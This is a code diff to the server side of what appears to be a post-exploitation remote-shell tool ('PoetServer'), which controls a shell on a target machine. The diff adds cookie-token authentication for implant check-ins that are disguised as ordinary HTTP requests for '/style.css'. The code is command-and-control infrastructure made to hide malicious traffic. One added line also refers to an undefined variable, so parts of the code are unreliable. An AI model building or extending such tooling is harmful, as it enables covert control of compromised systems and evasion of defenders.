@@ -3,11 +3,13 @@
 import re
 import sys
 import zlib
+import base64
 import socket
 import os.path
 import argparse
 from datetime import datetime
 
+import config as CFG
 from poetsocket import *
 
 __version__ = '0.4.1'
@@ -290,7 +292,7 @@ class PoetServer(object):
                 continue
             elif inp == 'exit':
                 break
-            elif inp in self.cmds:
+            elif inp.split()[0] in self.cmds:
                 print """[!] WARNING: You've entered a psh command into the real remote shell on the
     target. Continue? (y/n)""",
                 if raw_input().lower()[0] != 'y':
@@ -364,6 +366,29 @@ def die():
     sys.exit(0)
 
 
+def authenticate(ping):
+    """Verify that the client is in fact connecting by checking the request
+    path and the auth token contained in the cookie.
+
+    Args:
+        ping: http request sent from client (string)
+
+    Returns:
+        None: client authenticated successfully
+        str: the reason authentication failed
+    """
+       
+
+
+    if ping.startswith('GET /style.css HTTP/1.1'):
+        if 'Cookie: c={};'.format(base64.b64encode(CFG.AUTH)) in ping:
+            return None
+        else:
+            return 'AUTH TOKEN'
+    else:
+        return 'REQUEST'
+
+
 def main():
     args = get_args()
     if args.version:
@@ -386,8 +411,13 @@ def main():
         conntime = datetime.now()
         ping = conn.recv(SIZE)
         if not ping:
-            raise socket.error('socket connection broken')
-        if ping.startswith('GET /style.css HTTP/1.1'):
+            print '[!] ({}) Socket error: {}'.format(datetime.now(), e.message)
+            die()
+        auth_err = authenticate(ping)
+        if auth_err:
+            print '[!] ({}) Connected By: {} -> INVALID! ({})'.format(conntime, addr, auth_err)
+            conn.close()
+        else:
             print '[+] ({}) Connected By: {} -> VALID'.format(conntime, addr)
             conn.send(FAKEOK)
             conn.close()
@@ -397,9 +427,6 @@ def main():
             except socket.error as e:
                 print '[!] ({}) Socket error: {}'.format(datetime.now(), e.message)
                 die()
-        else:
-            print '[!] ({}) Connected By: {} -> INVALID!'.format(conntime, addr)
-            conn.close()
     die()
 
 if __name__ == '__main__':
